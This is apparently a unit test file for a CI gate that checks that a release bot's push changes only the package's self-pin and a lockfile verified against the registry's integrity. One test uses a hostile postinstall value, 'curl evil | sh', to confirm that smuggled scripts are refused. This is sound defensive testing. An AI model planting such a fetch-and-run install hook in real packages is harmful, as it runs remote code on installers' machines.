/**
 * The privileged push job accepts only a one-value self-pin raise
 * (CodySwannGT/lisa#4951).
 *
 * The job that holds the ruleset-bypassing deploy key installs nothing and
 * trusts nothing the unprivileged job produced. `verify-self-pin-raise.mjs` is
 * its only gate on package.json: the candidate must be main's text with exactly
 * the self-pin value replaced. Every case below is a way a compromised prepare
 * job could try to smuggle a second change through.
 * @module tests/unit/scripts/verify-self-pin-raise
 */
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

import { describe, expect, it, vi } from "vitest";

import {
  fetchRegistryIntegrity,
  main,
  mainLockfile,
  mainSpec,
  setSelfSpec,
  verifyLockfileMatch,
  verifySelfLockEntry,
  verifySelfPinRaise,
} from "../../../scripts/verify-self-pin-raise.mjs";

/** The package whose pin is raised. */
const SELF = "@codyswann/lisa";

/** The version the release published. */
const PUBLISHED = "6.0.0";

/** CLI option naming the tested candidate file. */
const CANDIDATE_FLAG = "--candidate";

/** CLI option naming the regenerated lockfile. */
const REGENERATED_FLAG = "--regenerated";

/** main's manifest before the raise. */
const BASE = {
  name: SELF,
  scripts: { postinstall: "node ./scripts/setup.mjs" },
  devDependencies: {
    "prettier-compat-3-9": "npm:prettier@3.9.10",
    [SELF]: "^5.0.1",
  },
};

/**
 * Serialise a manifest the way the repository stores it.
 * @param manifest - The manifest.
 * @returns Two-space JSON with a trailing newline.
 */
function text(manifest: Record<string, unknown>): string {
  return `${JSON.stringify(manifest, null, 2)}\n`;
}

/** The candidate a correct raise produces. */
const RAISED = text({
  ...BASE,
  devDependencies: { ...BASE.devDependencies, [SELF]: `^${PUBLISHED}` },
});

describe("the push job accepts only the self-pin line (#4951)", () => {
  it("accepts main's manifest with only the pin raised", () => {
    expect(verifySelfPinRaise(text(BASE), RAISED, PUBLISHED).ok).toBe(true);
  });

  it("refuses a candidate that also changes a script", () => {
    const smuggled = text({
      ...BASE,
      scripts: { postinstall: "curl evil | sh" },
      devDependencies: { ...BASE.devDependencies, [SELF]: `^${PUBLISHED}` },
    });

    expect(verifySelfPinRaise(text(BASE), smuggled, PUBLISHED).ok).toBe(false);
  });

  it("refuses a candidate that adds a dependency", () => {
    const smuggled = text({
      ...BASE,
      devDependencies: {
        ...BASE.devDependencies,
        [SELF]: `^${PUBLISHED}`,
        extra: "1.0.0",
      },
    });

    expect(verifySelfPinRaise(text(BASE), smuggled, PUBLISHED).ok).toBe(false);
  });

  it("refuses a pin to anything but the published version", () => {
    const other = text({
      ...BASE,
      devDependencies: { ...BASE.devDependencies, [SELF]: "^6.0.1" },
    });

    expect(verifySelfPinRaise(text(BASE), other, PUBLISHED).ok).toBe(false);
  });

  it("refuses a version that is not a plain release", () => {
    expect(verifySelfPinRaise(text(BASE), RAISED, "6.0.0-rc.1").ok).toBe(false);
    expect(verifySelfPinRaise(text(BASE), RAISED, "6.0.0 || *").ok).toBe(false);
  });

  it("refuses a whitespace-only reformatting alongside the raise", () => {
    expect(
      verifySelfPinRaise(text(BASE), RAISED.replace("\n", "\n "), PUBLISHED).ok
    ).toBe(false);
  });

  it("refuses when main already pins the version, so nothing is pushed", () => {
    expect(verifySelfPinRaise(RAISED, RAISED, PUBLISHED).ok).toBe(false);
  });

  it("refuses when main declares no self-pin", () => {
    expect(verifySelfPinRaise(text({ name: SELF }), RAISED, PUBLISHED).ok).toBe(
      false
    );
  });

  it("exits 0 only for a proven raise through the CLI", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "verify-self-pin-"));
    const base = path.join(dir, "base.json");
    const candidate = path.join(dir, "candidate.json");
    writeFileSync(base, text(BASE));
    writeFileSync(candidate, RAISED);
    const stdout = vi.spyOn(process.stdout, "write").mockReturnValue(true);
    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);

    const accepted = main([
      "--base",
      base,
      CANDIDATE_FLAG,
      candidate,
      "--version",
      PUBLISHED,
    ]);
    writeFileSync(candidate, text(BASE));
    const refused = main([
      "--base",
      base,
      CANDIDATE_FLAG,
      candidate,
      "--version",
      PUBLISHED,
    ]);
    const missing = main(["--base", base]);
    const printed = stdout.mock.calls.map(call => String(call[0])).join("");
    stdout.mockRestore();
    stderr.mockRestore();

    expect(accepted).toBe(0);
    expect(refused).toBe(1);
    expect(missing).toBe(1);
    expect(printed).toContain("verify-self-pin-raise: ok");
    expect(printed).toContain("verify-self-pin-raise: refused");
  });
});

/**
 * The repository's real lockfile, which pins the self-dependency at
 * its current release — the shape a regenerated lockfile actually has, with the
 * patchedDependencies section, nested `@codyswann/lisa/<dep>` entries and all.
 */
const LOCK = readFileSync(
  path.join(import.meta.dirname, "..", "..", "..", "bun.lock"),
  "utf8"
);

/**
 * The version the real lockfile pins the self-dependency at. Read from the
 * file rather than written down, so the next automated raise does not turn
 * these tests red.
 */
const LOCKED = (/^ {4}"@codyswann\/lisa": \["@codyswann\/lisa@([^"]+)"/m.exec(
  LOCK
) ?? [])[1] as string;

/** The self entry's integrity in that lockfile: the registry's answer. */
const INTEGRITY = (/^ {4}"@codyswann\/lisa": \[.*"(sha512-[^"]+)"\],$/m.exec(
  LOCK
) ?? [])[1] as string;

/** A patched dependency's line in {@link PATCHED_LOCK}. */
const PATCH_LINE = '    "picomatch@4.0.3": "patches/picomatch@4.0.3.patch",';

/**
 * A small, fixed bun.lock with a patchedDependencies section. The patch-path
 * cases use it rather than the real lockfile, so they keep testing the
 * verifier after the repository drops its last dependency patch.
 */
const PATCHED_LOCK = [
  "{",
  '  "lockfileVersion": 1,',
  '  "workspaces": {',
  '    "": {',
  '      "name": "fixture",',
  "    },",
  "  },",
  '  "patchedDependencies": {',
  PATCH_LINE,
  '    "semver@7.8.1": "patches/semver@7.8.1.patch",',
  "  },",
  '  "packages": {',
  '    "picomatch": ["picomatch@4.0.3", "", {}, "sha512-AAAA"],',
  "  }",
  "}",
  "",
].join("\n");

/** A different, well-formed integrity value. */
const FORGED = `sha512-${"A".repeat(86)}==`;

describe("the push job pushes only the lockfile it regenerated (#4951)", () => {
  it("accepts the tested lockfile when it is byte-identical to the regenerated one", () => {
    expect(verifyLockfileMatch(LOCK, LOCK).ok).toBe(true);
  });

  it("refuses an extra changed entry and names the line", () => {
    const lines = LOCK.split("\n");
    const other = lines.findIndex(
      line => /^ {4}"[^@]/.test(line) && line.includes('", "", {')
    );
    const tampered = [
      ...lines.slice(0, other),
      lines[other]?.replace(
        /@(\d+)\./,
        (_match, major) => `@${Number(major) + 1}.`
      ),
      ...lines.slice(other + 1),
    ].join("\n");

    const verdict = verifyLockfileMatch(LOCK, tampered);

    expect(tampered).not.toBe(LOCK);
    expect(verdict.ok).toBe(false);
    expect(verdict.detail).toContain(`at line ${other + 1}`);
  });

  it("refuses a swapped integrity value on any entry", () => {
    const tampered = LOCK.replace(INTEGRITY, FORGED);

    expect(verifyLockfileMatch(LOCK, tampered).ok).toBe(false);
  });

  it("refuses a changed patchedDependencies entry or patch path", () => {
    const dropped = PATCHED_LOCK.replace(`${PATCH_LINE}\n`, "");
    const repointed = PATCHED_LOCK.replace(
      PATCH_LINE,
      PATCH_LINE.replace(/\.patch"/, '.other.patch"')
    );

    expect(dropped).not.toBe(PATCHED_LOCK);
    expect(repointed).not.toBe(PATCHED_LOCK);
    expect(verifyLockfileMatch(PATCHED_LOCK, dropped).ok).toBe(false);
    expect(verifyLockfileMatch(PATCHED_LOCK, repointed).ok).toBe(false);
  });

  it("refuses a missing or added trailing newline", () => {
    expect(verifyLockfileMatch(LOCK, LOCK.trimEnd()).ok).toBe(false);
    expect(verifyLockfileMatch(LOCK, `${LOCK}\n`).ok).toBe(false);
    expect(verifyLockfileMatch(LOCK, `${LOCK}\n`).detail).toContain(
      "<end of file>"
    );
  });

  it("refuses the same entries in a different order", () => {
    const lines = LOCK.split("\n");
    const first = lines.findIndex(line =>
      line.startsWith('    "@codyswann/lisa": ')
    );
    const reordered = [
      ...lines.slice(0, first),
      lines[first + 2],
      lines[first + 1],
      lines[first],
      ...lines.slice(first + 3),
    ].join("\n");

    expect(reordered).not.toBe(LOCK);
    expect(verifyLockfileMatch(LOCK, reordered).ok).toBe(false);
  });

  it("requires the self entry to be the published version at the registry's integrity", () => {
    expect(verifySelfLockEntry(LOCK, LOCKED, INTEGRITY).ok).toBe(true);
    expect(verifySelfLockEntry(LOCK, LOCKED, FORGED).ok).toBe(false);
    expect(verifySelfLockEntry(LOCK, `${LOCKED}9`, INTEGRITY).ok).toBe(false);
  });

  it("refuses a lockfile with no self entry or a duplicated one", () => {
    const entry = LOCK.split("\n").find(line =>
      line.startsWith('    "@codyswann/lisa": ')
    ) as string;

    expect(
      verifySelfLockEntry(LOCK.replace(`${entry}\n`, ""), LOCKED, INTEGRITY).ok
    ).toBe(false);
    expect(
      verifySelfLockEntry(
        LOCK.replace(entry, `${entry}\n${entry}`),
        LOCKED,
        INTEGRITY
      ).ok
    ).toBe(false);
  });
});

/**
 * A fetch standing in for the registry's exact-version document.
 * @param answer - Status and body, or an error to throw.
 * @returns A stand-in for global fetch.
 */
function registryAnswering(
  answer: { status: number; body?: unknown } | Error
): typeof fetch {
  return (async () => {
    if (answer instanceof Error) throw answer;
    return {
      ok: answer.status >= 200 && answer.status < 300,
      status: answer.status,
      json: async () => answer.body,
    };
  }) as unknown as typeof fetch;
}

/**
 * A sleep stand-in, so retry cases do not wait out the real back-off.
 * @returns A resolved promise.
 */
async function noSleep(): Promise<void> {
  // Deliberately waits for nothing.
}

/**
 * A fetch that gives each answer in turn, repeating the last.
 * @param answers - Status-and-body answers or errors, in order.
 * @returns A stand-in for global fetch.
 */
function sequence(
  answers: readonly ({ status: number; body?: unknown } | Error)[]
): typeof fetch {
  const calls = { count: 0 };
  return ((...args: Parameters<typeof fetch>) => {
    const answer = answers[Math.min(calls.count, answers.length - 1)] as
      | { status: number; body?: unknown }
      | Error;
    calls.count += 1;
    return registryAnswering(answer)(...args);
  }) as typeof fetch;
}

describe("the registry integrity is fetched and fails closed (#4951)", () => {
  it("returns dist.integrity for exactly the requested version", async () => {
    const answer = await fetchRegistryIntegrity({
      version: LOCKED,
      fetchImpl: registryAnswering({
        status: 200,
        body: { version: LOCKED, dist: { integrity: INTEGRITY } },
      }),
    });

    expect(answer.integrity).toBe(INTEGRITY);
  });

  it("fails closed on a 404, a network error, a timeout or a wrong document", async () => {
    const answers = await Promise.all(
      [
        registryAnswering({ status: 404 }),
        registryAnswering(new Error("ECONNRESET")),
        registryAnswering(new DOMException("timed out", "TimeoutError")),
        registryAnswering({
          status: 200,
          body: { version: `${LOCKED}9`, dist: { integrity: INTEGRITY } },
        }),
        registryAnswering({ status: 200, body: { version: LOCKED } }),
      ].map(fetchImpl =>
        fetchRegistryIntegrity({ version: LOCKED, fetchImpl, sleep: noSleep })
      )
    );

    answers.forEach(answer => expect(answer.integrity).toBeNull());
  });

  it("passes a deadline to the request", async () => {
    const seen: (AbortSignal | undefined)[] = [];
    const fetchImpl = (async (_url: string, init?: RequestInit) => {
      seen.push(init?.signal ?? undefined);
      return { ok: false, status: 500, json: async () => ({}) };
    }) as unknown as typeof fetch;

    await fetchRegistryIntegrity({
      version: LOCKED,
      fetchImpl,
      sleep: noSleep,
    });

    expect(seen[0]).toBeInstanceOf(AbortSignal);
  });

  it("retries a network error, a deadline or a 5xx, then answers", async () => {
    const failures = [
      new Error("ECONNRESET"),
      new DOMException("timed out", "TimeoutError"),
      { status: 503 },
    ];
    const answers = await Promise.all(
      failures.map(failure => {
        const fetchImpl = sequence([
          failure,
          {
            status: 200,
            body: { version: LOCKED, dist: { integrity: INTEGRITY } },
          },
        ]);
        return fetchRegistryIntegrity({
          version: LOCKED,
          fetchImpl,
          sleep: noSleep,
        });
      })
    );

    answers.forEach(answer => expect(answer.integrity).toBe(INTEGRITY));
  });

  it("still fails closed when every bounded attempt is transient", async () => {
    const fetchImpl = vi.fn(registryAnswering(new Error("ECONNRESET")));
    const delays: number[] = [];

    const answer = await fetchRegistryIntegrity({
      version: LOCKED,
      fetchImpl,
      sleep: async (milliseconds: number) => {
        delays.push(milliseconds);
      },
    });

    expect(answer.integrity).toBeNull();
    expect(answer.detail).toContain("after 3 attempts");
    expect(fetchImpl).toHaveBeenCalledTimes(3);
    expect(delays).toHaveLength(2);
    expect(delays[1]).toBeGreaterThan(delays[0] as number);
  });

  it("never asks again after a 404, another 4xx or a wrong document", async () => {
    const answers = [
      { status: 404 },
      { status: 403 },
      {
        status: 200,
        body: { version: `${LOCKED}9`, dist: { integrity: INTEGRITY } },
      },
      { status: 200, body: { version: LOCKED } },
    ];
    const calls = await Promise.all(
      answers.map(async first => {
        const fetchImpl = vi.fn(
          sequence([
            first,
            {
              status: 200,
              body: { version: LOCKED, dist: { integrity: INTEGRITY } },
            },
          ])
        );
        const answer = await fetchRegistryIntegrity({
          version: LOCKED,
          fetchImpl,
          sleep: noSleep,
        });
        return { answer, count: fetchImpl.mock.calls.length };
      })
    );

    calls.forEach(({ answer, count }) => {
      expect(answer.integrity).toBeNull();
      expect(count).toBe(1);
    });
  });
});

describe("the lockfile CLI exits 0 only when both checks pass (#4951)", () => {
  /**
   * Run the lockfile mode against files written to disk.
   * @param candidate - The tested lockfile text.
   * @param fetchImpl - The registry stand-in.
   * @returns The exit code.
   */
  async function runLockfile(
    candidate: string,
    fetchImpl: typeof fetch
  ): Promise<number> {
    const dir = mkdtempSync(path.join(tmpdir(), "verify-self-lock-"));
    const regenerated = path.join(dir, "regenerated.lock");
    const tested = path.join(dir, "tested.lock");
    writeFileSync(regenerated, LOCK);
    writeFileSync(tested, candidate);
    const stdout = vi.spyOn(process.stdout, "write").mockReturnValue(true);
    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
    const code = await mainLockfile(
      [
        REGENERATED_FLAG,
        regenerated,
        CANDIDATE_FLAG,
        tested,
        "--version",
        LOCKED,
      ],
      { fetchImpl, sleep: noSleep }
    );
    stdout.mockRestore();
    stderr.mockRestore();
    return code;
  }

  const honest = registryAnswering({
    status: 200,
    body: { version: LOCKED, dist: { integrity: INTEGRITY } },
  });

  it("accepts a matching lockfile whose self entry the registry vouches for", async () => {
    expect(await runLockfile(LOCK, honest)).toBe(0);
  });

  it("refuses a tampered lockfile before asking the registry", async () => {
    const asked = vi.fn(honest);

    expect(await runLockfile(LOCK.replace(INTEGRITY, FORGED), asked)).toBe(1);
    expect(asked).not.toHaveBeenCalled();
  });

  it("refuses when the registry cannot answer", async () => {
    expect(await runLockfile(LOCK, registryAnswering(new Error("down")))).toBe(
      1
    );
  });

  it("refuses when the registry reports a different integrity", async () => {
    const other = registryAnswering({
      status: 200,
      body: { version: LOCKED, dist: { integrity: FORGED } },
    });

    expect(await runLockfile(LOCK, other)).toBe(1);
  });

  it("refuses a missing option or a non-release version", async () => {
    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
    const missing = await mainLockfile([REGENERATED_FLAG, "x"]);
    const prerelease = await mainLockfile([
      REGENERATED_FLAG,
      "x",
      CANDIDATE_FLAG,
      "y",
      "--version",
      `${LOCKED}-rc.1`,
    ]);
    stderr.mockRestore();

    expect(missing).toBe(1);
    expect(prerelease).toBe(1);
  });
});

/** main's manifest once the raise script has written the caret range. */
const CARET_MANIFEST = RAISED;

/** The same manifest with the pin set to exactly the published version. */
const EXACT_MANIFEST = text({
  ...BASE,
  devDependencies: { ...BASE.devDependencies, [SELF]: PUBLISHED },
});

/**
 * A bun.lock whose root workspace declares the self-pin as `spec`.
 * @param spec - The declared specifier.
 * @returns The lockfile text.
 */
function workspaceLock(spec: string): string {
  return [
    "{",
    '  "workspaces": {',
    '    "": {',
    '      "devDependencies": {',
    `        "${SELF}": "${spec}",`,
    "      },",
    "    },",
    "  },",
    '  "packages": {',
    `    "${SELF}": ["${SELF}@${PUBLISHED}", "", {}, "sha512-AAAA"],`,
    "  }",
    "}",
    "",
  ].join("\n");
}

describe("both jobs resolve exactly the published release (#4951)", () => {
  it("sets the caret range to the exact version for resolution", () => {
    const result = setSelfSpec({
      manifestText: CARET_MANIFEST,
      lockText: workspaceLock("^5.0.1"),
      version: PUBLISHED,
      form: "exact",
    });

    expect(result.ok).toBe(true);
    expect(result.manifestText).toBe(EXACT_MANIFEST);
  });

  it("writes the committed caret range back to the manifest and the lockfile", () => {
    const result = setSelfSpec({
      manifestText: EXACT_MANIFEST,
      lockText: workspaceLock(PUBLISHED),
      version: PUBLISHED,
      form: "caret",
    });

    expect(result.ok).toBe(true);
    expect(result.manifestText).toBe(CARET_MANIFEST);
    expect(result.lockText).toBe(workspaceLock(`^${PUBLISHED}`));
    expect(
      verifySelfPinRaise(text(BASE), result.manifestText ?? "", PUBLISHED).ok
    ).toBe(true);
  });

  it("refuses to commit the caret range before the exact resolution ran", () => {
    expect(
      setSelfSpec({
        manifestText: EXACT_MANIFEST,
        lockText: workspaceLock("^5.0.1"),
        version: PUBLISHED,
        form: "caret",
      }).ok
    ).toBe(false);
    expect(
      setSelfSpec({
        manifestText: CARET_MANIFEST,
        lockText: workspaceLock(PUBLISHED),
        version: PUBLISHED,
        form: "caret",
      }).ok
    ).toBe(false);
  });

  it("refuses a manifest that does not declare the raised range", () => {
    expect(
      setSelfSpec({
        manifestText: text(BASE),
        lockText: workspaceLock("^5.0.1"),
        version: PUBLISHED,
        form: "exact",
      }).ok
    ).toBe(false);
  });

  it("refuses a non-release version or an unknown form", () => {
    const input = {
      manifestText: CARET_MANIFEST,
      lockText: workspaceLock("^5.0.1"),
    };

    expect(
      setSelfSpec({ ...input, version: "6.0.0-rc.1", form: "exact" }).ok
    ).toBe(false);
    expect(
      setSelfSpec({ ...input, version: PUBLISHED, form: "tilde" as "exact" }).ok
    ).toBe(false);
  });

  it("switches the files in place through the CLI and exits 0 only on success", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "verify-self-spec-"));
    const manifest = path.join(dir, "package.json");
    const lockfile = path.join(dir, "bun.lock");
    writeFileSync(manifest, CARET_MANIFEST);
    writeFileSync(lockfile, workspaceLock("^5.0.1"));
    const stdout = vi.spyOn(process.stdout, "write").mockReturnValue(true);
    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
    const files = ["--manifest", manifest, "--lockfile", lockfile];

    const exact = mainSpec([
      "--form",
      "exact",
      "--version",
      PUBLISHED,
      ...files,
    ]);
    const afterExact = readFileSync(manifest, "utf8");
    writeFileSync(lockfile, workspaceLock(PUBLISHED));
    const caret = mainSpec([
      "--form",
      "caret",
      "--version",
      PUBLISHED,
      ...files,
    ]);
    const again = mainSpec([
      "--form",
      "caret",
      "--version",
      PUBLISHED,
      ...files,
    ]);
    const missing = mainSpec(["--form", "caret"]);
    stdout.mockRestore();
    stderr.mockRestore();

    expect(exact).toBe(0);
    expect(afterExact).toBe(EXACT_MANIFEST);
    expect(caret).toBe(0);
    expect(readFileSync(manifest, "utf8")).toBe(CARET_MANIFEST);
    expect(readFileSync(lockfile, "utf8")).toBe(workspaceLock(`^${PUBLISHED}`));
    expect(again).toBe(1);
    expect(missing).toBe(1);
  });
});
